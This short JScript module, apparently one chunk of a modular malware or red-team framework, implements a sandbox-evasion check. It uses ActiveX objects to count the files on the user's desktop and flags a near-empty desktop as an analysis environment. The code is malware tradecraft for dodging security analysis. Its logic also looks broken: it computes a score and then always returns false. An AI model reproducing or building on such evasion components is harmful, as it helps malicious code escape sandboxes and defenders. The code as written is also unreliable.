// chunk: evasion/desktop_files
// depends: core/run_cmd
// provides: check_desktop
// format: jscript
// note: Counts files on user desktop via FSO. Empty or near-empty desktop
//       is a sandbox indicator — real users accumulate desktop files.

function check_desktop() {
    var score = 0;
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var desktop = sh.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Desktop";
        if (fso.FolderExists(desktop)) {
            var folder = fso.GetFolder(desktop);
            var count = folder.Files.Count;
            if (count < 3) score++;
        }
    } catch(e) {}
    return false;
}
